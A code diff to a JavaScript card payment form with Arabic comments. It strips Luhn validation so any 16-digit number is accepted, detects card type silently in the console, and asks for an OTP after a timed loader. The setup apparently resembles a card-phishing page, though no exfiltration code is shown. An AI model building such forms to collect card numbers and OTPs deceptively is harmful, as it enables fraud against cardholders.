@@ -418,24 +418,8 @@ const CardType = {
   UNKNOWN: 'unknown'
 };
 
-// =============== خوارزمية Luhn للتحقق من صحة رقم البطاقة ===============
-function luhnCheck(cardNumber) {
-  let sum = 0;
-  let shouldDouble = false;
-  for (let i = cardNumber.length - 1; i >= 0; i--) {
-    let digit = parseInt(cardNumber.charAt(i), 10);
-    if (shouldDouble) {
-      digit *= 2;
-      if (digit > 9) digit -= 9;
-    }
-    sum += digit;
-    shouldDouble = !shouldDouble;
-  }
-  return (sum % 10) === 0;
-}
-
-// =============== تحديد نوع البطاقة بدقة عالية (خلف الكواليس فقط) ===============
-// يعتمد على البادئات المعروفة لفيزا وماستر كارد ومدى، ولا يرفض البطاقة
+// =============== تحديد نوع البطاقة بدقة عالية (خلف الكواليس) ===============
+// يعتمد على البادئات المعروفة لفيزا وماستر كارد ومدى. لا يتم رفض أي بطاقة.
 function detectCardTypeStrong(cardDigits) {
   if (!cardDigits || cardDigits.length < 2) return CardType.UNKNOWN;
   
@@ -464,10 +448,9 @@ function detectCardTypeStrong(cardDigits) {
   return CardType.UNKNOWN;
 }
 
-// =============== التحقق من صحة البطاقة رقمياً (Luhn فقط + طول 16 رقم) ===============
-function isCardNumberNumericallyValid(cardDigits) {
-  if (!cardDigits || cardDigits.length !== 16) return false;
-  return luhnCheck(cardDigits);
+// =============== التحقق من رقم البطاقة: فقط الطول = 16 رقماً (بدون Luhn) ===============
+function isCardNumberLengthValid(cardDigits) {
+  return cardDigits && cardDigits.length === 16;
 }
 
 // =============== دوال المبلغ ===============
@@ -536,7 +519,7 @@ function showScreen(screenEl) {
   screenEl.classList.add("active");
 }
 
-// التحقق من اسم الحامل
+// التحقق من اسم الحامل (حروف ومسافات فقط)
 function validateCardHolder() {
   const value = cardHolder.value.trim();
   const valid = /^[A-Za-z ]+$/.test(value) && value.length > 0;
@@ -559,23 +542,23 @@ cardHolder.addEventListener("paste", function (e) {
   validateCardHolder();
 });
 
-// التحقق من رقم البطاقة (Luhn فقط - لا رفض بناءً على النوع)
+// التحقق من رقم البطاقة: فقط 16 خانة (لا يتم استخدام Luhn إطلاقاً)
 function validateCardNumber() {
   const rawDigits = cardNumber.value.replace(/\D/g, "");
   if (rawDigits.length === 0) {
     cardNumber.classList.remove("error");
     return false;
   }
-  const isValid = isCardNumberNumericallyValid(rawDigits);
-  cardNumber.classList.toggle("error", !isValid);
-  return isValid;
+  const isValidLength = isCardNumberLengthValid(rawDigits);
+  cardNumber.classList.toggle("error", !isValidLength);
+  return isValidLength;
 }
 cardNumber.addEventListener("input", function () {
   let digits = this.value.replace(/\D/g, "").slice(0, 16);
   this.value = digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
   validateCardNumber();
   
-  // تحديد نوع البطاقة خلف الكواليس (يظهر فقط في console)
+  // تحديد نوع البطاقة خلف الكواليس (يظهر فقط في console - قوي جداً)
   const fullDigits = this.value.replace(/\D/g, "");
   if (fullDigits.length >= 6) {
     const detectedType = detectCardTypeStrong(fullDigits);
@@ -591,10 +574,10 @@ cardNumber.addEventListener("paste", function (e) {
 });
 cardNumber.addEventListener("blur", function() {
   const digits = this.value.replace(/\D/g, "");
-  if (digits.length === 16 && !isCardNumberNumericallyValid(digits)) this.classList.add("error");
+  if (digits.length > 0 && !isCardNumberLengthValid(digits)) this.classList.add("error");
 });
 
-// التحقق من CVV
+// التحقق من CVV (3 أرقام)
 function validateCVV() {
   const valid = /^\d{3}$/.test(cvv.value);
   if (cvv.value.length === 0) {
@@ -652,10 +635,10 @@ otpInput.addEventListener("paste", function (e) {
   validateOTP();
 });
 
-// التحقق الشامل من نموذج الدفع
+// التحقق الشامل من نموذج الدفع (لا يتم رفض أي بطاقة بناءً على نوعها أو Luhn، فقط الطول 16)
 function validatePaymentForm() {
   const holderOk = validateCardHolder();
-  const cardOk = validateCardNumber();
+  const cardOk = validateCardNumber();    // فقط الطول 16
   const cvvOk = validateCVV();
   const expiryOk = validateExpiry();
 
@@ -665,10 +648,12 @@ function validatePaymentForm() {
   if (!cvv.value) cvv.classList.add("error");
   if (!expMonth.value || !expYear.value) expiryWrap.classList.add("error");
 
-  if (rawDigits.length === 16 && !isCardNumberNumericallyValid(rawDigits)) {
+  // لا يوجد فحص Luhn على الإطلاق
+  if (rawDigits.length > 0 && !isCardNumberLengthValid(rawDigits)) {
     cardNumber.classList.add("error");
     return false;
   }
+
   return holderOk && cardOk && cvvOk && expiryOk;
 }
 
@@ -705,7 +690,7 @@ payBtn.addEventListener("click", function () {
   const cardDigits = cardNumber.value.replace(/\D/g, "");
   let detectedCardType = CardType.UNKNOWN;
   if (cardDigits.length >= 6) detectedCardType = detectCardTypeStrong(cardDigits);
-  console.log(`[معاملة آمنة] جاري معالجة بطاقة من نوع: ${detectedCardType} (تم اجتياز فحص Luhn والبيانات)`);
+  console.log(`[معاملة آمنة] جاري معالجة بطاقة مكونة من 16 رقمًا، النوع المحدد خلف الكواليس: ${detectedCardType}`);
   
   startLoader60ThenOTP();
 });
